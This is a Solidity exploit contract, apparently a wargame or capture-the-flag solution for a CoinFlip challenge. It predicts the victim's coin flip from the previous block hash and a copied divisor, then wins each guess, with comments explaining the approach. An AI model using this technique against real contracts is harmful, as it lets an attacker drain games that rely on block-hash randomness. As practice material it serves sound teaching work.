// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/* We should make the contract ownable because in a real-world scenario you will not want
others to use your attacking contract. It is not necessary for this solution though.
The Ownable contract of OpenZeppelin will atribute ownership to the deployer and comes 
with a nice "onlyOwner()" modifier for us to use in protected functions.

You can either use an interface or import the contract.

I usually put the interfaces at the end of the code. It is not a rule of thumb though.
You will need to create the interface to the coinflip contract to interact with it from
this one.

I ended up using the solution to import the contract, which is a good and clean one too.
In the real world, though, interfaces can be more handy.

It is important to notice that running this on hardhat's local network didn't work for
both cases (importing contract or interface). It would always give a "function selector
was not recognized" error. It worked fine is BSC Testnet though.*/

import "../contracts/CoinFlip.sol";

contract CoinFlipAttack{

  // Here we just copied the factor used in the pseudo randomness of the victim contract
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 lastHash;

  // We create the contract object that will have the methods defined in the interface
  CoinFlip victim = CoinFlip(0xf46E81C3dd07f18e11F5aCfa17AD1A0b241aAfc4); //TODO: Include your deployed target address

  /* We could make the constructor in a way so you can change the contract address and factor
  as needed when deploying. For the sake of simplicity we won't do it here though.*/
  constructor(){
  }

  function alwaysWins() public returns(bool){
    
    /* This function is actually a no-brainer. You just copy the original one until you get
    the target value, in this case the "side" bool. Then you make the guess in the victim.
    Since the goal is to have 10 consecutive wins, you may think of just making it do it 
    10 times in a loop but it wouldn't work as it would still be the same block number.
    You will have to send 10 transactions from your web3 backend, waiting for the blocknumbers
    to pass between each call. */
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    return victim.flip(side);
  }
}

/* The easiest way to build an interface for another contract is to just copy the functions
"header" here:

interface Coinflip {
  function flip(bool _guess) external returns (bool);
}

*/